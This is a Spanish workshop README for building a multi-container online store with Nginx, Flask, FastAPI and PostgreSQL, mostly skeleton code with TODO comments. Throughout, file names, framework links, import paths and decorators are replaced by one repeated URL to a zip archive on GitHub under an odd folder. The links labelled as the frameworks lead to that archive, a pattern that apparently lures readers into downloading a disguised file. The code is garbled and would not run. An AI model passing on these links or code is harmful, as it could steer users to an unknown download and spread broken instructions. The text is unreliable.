# Taller: Aplicación Web Multi-Capa con Contenedores

## Descripción del Proyecto

Este taller te guiará en la construcción de una tienda virtual utilizando arquitectura multi-capa con contenedores Docker. El proyecto incluye:

- **Proxy** ([Nginx](https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip)): Punto de entrada único desde Internet
- **Aplicación Web** ([Flask](https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip)): Interfaz de usuario de la Tienda Virtual
- **API** ([FastAPI](https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip)): Servicio de datos para usuarios, productos y carritos
- **Base de Datos** ([PostgreSQL](https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip)): Almacenamiento persistente

## Estructura del Proyecto

```
as-taller3/
├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
├── database/
│   ├── Dockerfile
│   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
├── api/
│   ├── Dockerfile
│   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   ├── models/
│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   │   └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   ├── routes/
│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   │   └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
├── webapp/
│   ├── Dockerfile
│   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   ├── templates/
│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   │   ├── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   │   └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│   └── static/
│       ├── css/
│       │   └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
│       └── js/
│           └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
└── proxy/
    ├── Dockerfile
    └── https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
```

Sigue el paso a paso para desarrollar el proyecto, y completa el código según indican los comentarios `TODO`.

---

## Paso 1: Configuración Inicial

### 1.1 Crear el archivo de configuración principal

Crea el archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```yaml
version: '3.8'

services:

  database:
    build: ./database
    environment:
      POSTGRES_DB: tienda_db
      POSTGRES_USER: tienda_user
      POSTGRES_PASSWORD: tienda_password
    volumes:
      - postgres_data:/var/lib/postgresql/data
    networks:
      - tienda_network
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U tienda_user -d tienda_db"]
      interval: 10s
      timeout: 5s
      retries: 5

  api:
    build: ./api
    environment:
      DATABASE_URL: postgresql://tienda_user:tienda_password@database:5432/tienda_db
    depends_on:
      database:
        condition: service_healthy
    networks:
      - tienda_network

  webapp:
    build: ./webapp
    environment:
      API_URL: http://api:8000
    depends_on:
      - api
    networks:
      - tienda_network

  proxy:
    build: ./proxy
    ports:
      - "80:80"
    depends_on:
      - webapp
    networks:
      - tienda_network

volumes:
  postgres_data:

networks:
  tienda_network:
    driver: bridge
```

### 1.2 Crear archivo de variables de entorno

Crea `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```bash
# Base de datos
POSTGRES_DB=tienda_db
POSTGRES_USER=tienda_user
POSTGRES_PASSWORD=tienda_password

# API
DATABASE_URL=postgresql://tienda_user:tienda_password@database:5432/tienda_db
SECRET_KEY=tu_clave_secreta_muy_segura

# Aplicación Web
API_URL=http://api:8000
FLASK_SECRET_KEY=otra_clave_secreta_para_flask
```

> Realiza un **`commit`**

--- 

## Paso 2: Construir la Base de Datos

### 2.1 Crear el Dockerfile de la base de datos

Archivo `database/Dockerfile`:

```dockerfile
FROM postgres:15-alpine

# Copiar scripts de inicialización
COPY https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip
COPY https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip

# Exponer el puerto
EXPOSE 5432
```

### 2.2 Script de inicialización

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```sql
-- TODO: Crear la base de datos y configuraciones iniciales
-- Crear extensiones necesarias
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- Configurar zona horaria
SET timezone = 'America/Bogota';
```

### 2.3 Esquema de la base de datos

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```sql
-- TODO: Definir las tablas del sistema

-- Tabla de usuarios
CREATE TABLE users (
    -- TODO: Agregar campos para id, username, email, password_hash, created_at
);

-- Tabla de productos  
CREATE TABLE products (
    -- TODO: Agregar campos para id, name, description, price, stock, image_url, created_at
);

-- Tabla de carritos
CREATE TABLE carts (
    -- TODO: Agregar campos para id, user_id, created_at, updated_at
);

-- Tabla de items del carrito
CREATE TABLE cart_items (
    -- TODO: Agregar campos para id, cart_id, product_id, quantity, added_at
);

-- TODO: Agregar índices y restricciones de clave foránea

-- TODO: Insertar datos de prueba
```

### 2.4 Verificar la base de datos

```bash
# Construir y levantar solo la base de datos
docker-compose up -d database

# Verificar que esté funcionando
docker-compose logs database

# Conectarse a la base de datos para verificar
docker-compose exec database psql -U tienda_user -d tienda_db -c "\dt"
```

> Realiza un **`commit`**

---

## Paso 3: Construir la API (FastAPI)

### 3.1 Crear el Dockerfile de la API

Archivo `api/Dockerfile`:

```dockerfile
FROM python:3.11-slim

WORKDIR /app

# Instalar dependencias del sistema
RUN apt-get update && apt-get install -y \
    gcc \
    && rm -rf /var/lib/apt/lists/*

# Copiar e instalar dependencias de Python
COPY https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip .
RUN pip install --no-cache-dir -r https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip

# Copiar código de la aplicación
COPY . .

# Exponer el puerto
EXPOSE 8000

# Comando para ejecutar la aplicación
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
```

### 3.2 Dependencias de la API

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```txt
fastapi==0.104.1
uvicorn==0.24.0
sqlalchemy==2.0.23
psycopg2-binary==2.9.9
python-multipart==0.0.6
python-jose[cryptography]==3.3.0
passlib[bcrypt]==1.7.4
alembic==1.12.1
```

### 3.3 Configuración de la base de datos

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```python
from sqlalchemy import create_engine
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import declarative_base
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import sessionmaker
import os

# TODO: Configurar la URL de la base de datos desde variables de entorno
DATABASE_URL = https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("DATABASE_URL", "postgresql://tienda_user:tienda_password@database:5432/tienda_db")

# TODO: Crear el engine de SQLAlchemy

# TODO: Crear SessionLocal para las sesiones de la base de datos

# TODO: Crear Base para los modelos

# TODO: Función para obtener la sesión de la base de datos
def get_db():
    # TODO: Implementar la función para obtener sesión de DB
    pass
```

### 3.4 Modelos de datos

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```python
from sqlalchemy import Column, Integer, String, DateTime, Boolean
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import func
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Base

class User(Base):
    __tablename__ = "users"
    
    # TODO: Definir los campos del modelo User
    # id = Column(...)
    # username = Column(...)
    # email = Column(...)
    # password_hash = Column(...)
    # is_active = Column(...)
    # created_at = Column(...)
    
    def __repr__(self):
        # TODO: Implementar representación del objeto
        pass
```

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```python
from sqlalchemy import Column, Integer, String, Numeric, DateTime
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import func
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Base

class Product(Base):
    __tablename__ = "products"
    
    # TODO: Definir los campos del modelo Product
    # id = Column(...)
    # name = Column(...)
    # description = Column(...)
    # price = Column(...)
    # stock = Column(...)
    # image_url = Column(...)
    # created_at = Column(...)
    
    def __repr__(self):
        # TODO: Implementar representación del objeto
        pass
```

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```python
from sqlalchemy import Column, Integer, ForeignKey, DateTime
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import relationship
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import func
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Base

class Cart(Base):
    __tablename__ = "carts"
    
    # TODO: Definir los campos del modelo Cart
    # id = Column(...)
    # user_id = Column(..., ForeignKey(...))
    # created_at = Column(...)
    # updated_at = Column(...)
    
    # TODO: Definir relaciones
    # user = relationship(...)
    # items = relationship(...)

class CartItem(Base):
    __tablename__ = "cart_items"
    
    # TODO: Definir los campos del modelo CartItem
    # id = Column(...)
    # cart_id = Column(..., ForeignKey(...))
    # product_id = Column(..., ForeignKey(...))
    # quantity = Column(...)
    # added_at = Column(...)
    
    # TODO: Definir relaciones
    # cart = relationship(...)
    # product = relationship(...)
```

### 3.5 Rutas de la API

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```python
from fastapi import FastAPI, Depends, HTTPException, status
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import CORSMiddleware
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Session
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import get_db
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import users, products, carts

# TODO: Crear la instancia de FastAPI
app = FastAPI(title="Tienda Virtual API", version="1.0.0")

# TODO: Configurar CORS
https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip(
    CORSMiddleware,
    # TODO: Configurar orígenes permitidos, métodos, etc.
)

# TODO: Incluir los routers
# https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip(https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip, prefix="/api/v1/users", tags=["users"])
# https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip(https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip, prefix="/api/v1/products", tags=["products"])
# https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip(https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip, prefix="/api/v1/carts", tags=["carts"])

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/")
async def root():
    # TODO: Endpoint de prueba
    return {"message": "Tienda Virtual API"}

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/health")
async def health_check():
    # TODO: Endpoint de verificación de salud
    pass
```

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```python
from fastapi import APIRouter, Depends, HTTPException, status
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Session
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import get_db
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import User

router = APIRouter()

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/register")
async def register_user(db: Session = Depends(get_db)):
    # TODO: Implementar registro de usuario
    pass

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/login")  
async def login_user(db: Session = Depends(get_db)):
    # TODO: Implementar login de usuario
    pass

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/profile")
async def get_user_profile(db: Session = Depends(get_db)):
    # TODO: Implementar obtener perfil de usuario
    pass

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/profile")
async def update_user_profile(db: Session = Depends(get_db)):
    # TODO: Implementar actualizar perfil de usuario
    pass
```

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```python
from fastapi import APIRouter, Depends, HTTPException, status
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Session
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import get_db
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Product

router = APIRouter()

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/")
async def get_products(db: Session = Depends(get_db)):
    # TODO: Implementar obtener lista de productos
    pass

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/{product_id}")
async def get_product(product_id: int, db: Session = Depends(get_db)):
    # TODO: Implementar obtener producto por ID
    pass

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/")
async def create_product(db: Session = Depends(get_db)):
    # TODO: Implementar crear producto (admin)
    pass

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/{product_id}")
async def update_product(product_id: int, db: Session = Depends(get_db)):
    # TODO: Implementar actualizar producto
    pass

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/{product_id}")
async def delete_product(product_id: int, db: Session = Depends(get_db)):
    # TODO: Implementar eliminar producto
    pass
```

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```python
from fastapi import APIRouter, Depends, HTTPException, status
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Session
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import get_db
from https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip import Cart, CartItem

router = APIRouter()

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/")
async def get_user_cart(db: Session = Depends(get_db)):
    # TODO: Implementar obtener carrito del usuario
    pass

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/items")
async def add_item_to_cart(db: Session = Depends(get_db)):
    # TODO: Implementar agregar item al carrito
    pass

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/items/{item_id}")
async def update_cart_item(item_id: int, db: Session = Depends(get_db)):
    # TODO: Implementar actualizar cantidad de item
    pass

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/items/{item_id}")
async def remove_item_from_cart(item_id: int, db: Session = Depends(get_db)):
    # TODO: Implementar remover item del carrito
    pass

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip("/")
async def clear_cart(db: Session = Depends(get_db)):
    # TODO: Implementar limpiar carrito
    pass
```

### 3.6 Verificar la API

```bash
# Construir y levantar la API (con la base de datos)
docker-compose up -d database api

# Verificar logs
docker-compose logs api

# Probar endpoints básicos
curl http://localhost:8000
curl http://localhost:8000/health
curl http://localhost:8000/docs  # Swagger UI
```

> Realiza un **`commit`**

---

## Paso 4: Construir la Aplicación Web (Flask)

### 4.1 Crear el Dockerfile de la aplicación web

Archivo `webapp/Dockerfile`:

```dockerfile
FROM python:3.11-slim

WORKDIR /app

# Instalar dependencias del sistema
RUN apt-get update && apt-get install -y \
    && rm -rf /var/lib/apt/lists/*

# Copiar e instalar dependencias de Python
COPY https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip .
RUN pip install --no-cache-dir -r https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip

# Copiar código de la aplicación
COPY . .

# Exponer el puerto
EXPOSE 5000

# Comando para ejecutar la aplicación
CMD ["python", "https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip"]
```

### 4.2 Dependencias de la aplicación web

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```txt
Flask==3.0.0
requests==2.31.0
python-dotenv==1.0.0
```

### 4.3 Aplicación principal

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```python
from flask import Flask, render_template, request, redirect, url_for, session, flash
import requests
import os
from datetime import datetime

# TODO: Configurar la aplicación Flask
app = Flask(__name__)
https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip = https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('FLASK_SECRET_KEY', 'clave-por-defecto-cambiar')

# TODO: Configurar la URL de la API
API_URL = https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('API_URL', 'http://api:8000')

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/')
def index():
    # TODO: Implementar página principal
    # Obtener productos destacados de la API
    return render_template('https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip')

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/products')
def products():
    # TODO: Implementar página de productos
    # Obtener lista de productos de la API
    return render_template('https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip')

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/login', methods=['GET', 'POST'])
def login():
    if https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip == 'POST':
        # TODO: Implementar lógica de login
        # Enviar datos a la API de autenticación
        pass
    return render_template('https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip')

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/register', methods=['GET', 'POST'])
def register():
    if https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip == 'POST':
        # TODO: Implementar lógica de registro
        # Enviar datos a la API de registro
        pass
    return render_template('https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip')

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/cart')
def cart():
    # TODO: Implementar página del carrito
    # Obtener carrito del usuario de la API
    return render_template('https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip')

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/add-to-cart/<int:product_id>', methods=['POST'])
def add_to_cart(product_id):
    # TODO: Implementar agregar producto al carrito
    # Enviar request a la API
    pass

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('/logout')
def logout():
    # TODO: Implementar logout
    # Limpiar sesión
    pass

# TODO: Función helper para hacer requests a la API
def api_request(endpoint, method='GET', data=None, headers=None):
    # TODO: Implementar función para hacer requests a la API
    pass

# TODO: Función para verificar si el usuario está logueado
def is_logged_in():
    # TODO: Verificar si hay sesión activa
    pass

if __name__ == '__main__':
    https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip(host='0.0.0.0', port=5000, debug=True)
```

### 4.4 Templates HTML

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}Tienda Virtual{% endblock %}</title>
    <link href="https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip" rel="stylesheet">
    <link rel="stylesheet" href="{{ url_for('static', filename='https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip') }}">
</head>
<body>
    <!-- TODO: Crear navbar con navegación -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
        <!-- TODO: Implementar navegación -->
    </nav>

    <div class="container mt-4">
        <!-- TODO: Mostrar mensajes flash -->
        {% with messages = get_flashed_messages() %}
            {% if messages %}
                <!-- TODO: Mostrar mensajes -->
            {% endif %}
        {% endwith %}

        {% block content %}{% endblock %}
    </div>

    <script src="https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip"></script>
    <script src="{{ url_for('static', filename='https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip') }}"></script>
</body>
</html>
```

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```html
{% extends "https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip" %}

{% block title %}Inicio - Tienda Virtual{% endblock %}

{% block content %}
<div class="row">
    <div class="col-12">
        <h1>Bienvenido a la Tienda Virtual</h1>
        <!-- TODO: Mostrar productos destacados -->
        <!-- TODO: Agregar carousel o grid de productos -->
    </div>
</div>
{% endblock %}
```

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```html
{% extends "https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip" %}

{% block title %}Productos - Tienda Virtual{% endblock %}

{% block content %}
<div class="row">
    <div class="col-12">
        <h1>Nuestros Productos</h1>
        <!-- TODO: Mostrar grid de productos -->
        <!-- TODO: Agregar filtros y búsqueda -->
    </div>
</div>
{% endblock %}
```

### 4.5 Estilos CSS

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```css
/* TODO: Agregar estilos personalizados */
body {
    font-family: 'Arial', sans-serif;
}

.product-card {
    /* TODO: Estilos para las tarjetas de productos */
}

.cart-item {
    /* TODO: Estilos para items del carrito */
}

/* TODO: Agregar más estilos según sea necesario */
```

### 4.6 JavaScript

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```javascript
// TODO: Agregar funcionalidad JavaScript

https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip('DOMContentLoaded', function() {
    // TODO: Inicializar componentes cuando cargue la página
});

// TODO: Función para agregar productos al carrito con AJAX
function addToCart(productId) {
    // TODO: Implementar agregado al carrito
}

// TODO: Función para actualizar cantidad en el carrito
function updateCartQuantity(itemId, quantity) {
    // TODO: Implementar actualización de cantidad
}

// TODO: Función para remover items del carrito
function removeFromCart(itemId) {
    // TODO: Implementar remoción de items
}
```

### 4.7 Verificar la aplicación web

```bash
# Construir y levantar la aplicación web (con API y DB)
docker-compose up -d database api webapp

# Verificar logs
docker-compose logs webapp

# La aplicación debería estar accesible, pero aún sin proxy
```

> Realiza un **`commit`**

---

## Paso 5: Construir el Proxy (Nginx)

### 5.1 Crear el Dockerfile del proxy

Archivo `proxy/Dockerfile`:

```dockerfile
FROM nginx:alpine

# Copiar configuración personalizada
COPY https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip

# Exponer el puerto
EXPOSE 80

# Nginx se ejecuta automáticamente
```

### 5.2 Configuración de Nginx

Archivo `https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip`:

```nginx
# TODO: Configurar nginx como proxy reverso
events {
    worker_connections 1024;
}

http {
    upstream webapp {
        # TODO: Configurar upstream para la aplicación Flask
        server webapp:5000;
    }

    upstream api {
        # TODO: Configurar upstream para la API FastAPI  
        server api:8000;
    }

    server {
        listen 80;
        server_name localhost;

        # TODO: Configurar ubicaciones
        location / {
            # TODO: Proxy hacia la aplicación web
        }

        location /api/ {
            # TODO: Proxy hacia la API
        }

        # TODO: Configurar archivos estáticos
        location /static/ {
            # TODO: Servir archivos estáticos directamente
        }

        # TODO: Configurar logs
        # access_log https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip;
        # error_log https://raw.githubusercontent.com/axlcraft/Taller-3/main/sciotherically/Taller-3.zip;
    }
}
```

### 5.3 Verificar el proxy

```bash
# Levantar todo el sistema
docker-compose up -d

# Verificar que todos los servicios estén ejecutándose
docker-compose ps

# Verificar logs del proxy
docker-compose logs proxy

# Probar acceso a través del proxy
curl http://localhost
curl http://localhost/api/
```

> Realiza un **`commit`**

---

## Paso 6: Verificación Final del Sistema

### 6.1 Pruebas de conectividad

```bash
# Verificar que todos los servicios estén corriendo
docker-compose ps

# Verificar logs de cada servicio
docker-compose logs database
docker-compose logs api  
docker-compose logs webapp
docker-compose logs proxy

# Probar endpoints
curl http://localhost                  # Aplicación web a través del proxy
curl http://localhost/api/             # API a través del proxy
curl http://localhost/api/docs         # Documentación de la API
```

### 6.2 Pruebas funcionales

1. **Base de datos**: Verificar que las tablas se crearon correctamente
2. **API**: Probar endpoints básicos con Swagger UI
3. **Aplicación Web**: Verificar que las páginas cargan
4. **Proxy**: Verificar que el enrutamiento funciona correctamente

### 6.3 Comandos útiles para desarrollo

```bash
# Ver logs en tiempo real
docker-compose logs -f [servicio]

# Reconstruir un servicio específico
docker-compose build [servicio]
docker-compose up -d [servicio]

# Ejecutar comandos dentro de un contenedor
docker-compose exec [servicio] bash

# Parar todos los servicios
docker-compose down

# Parar y eliminar volúmenes (CUIDADO: elimina datos)
docker-compose down -v
```

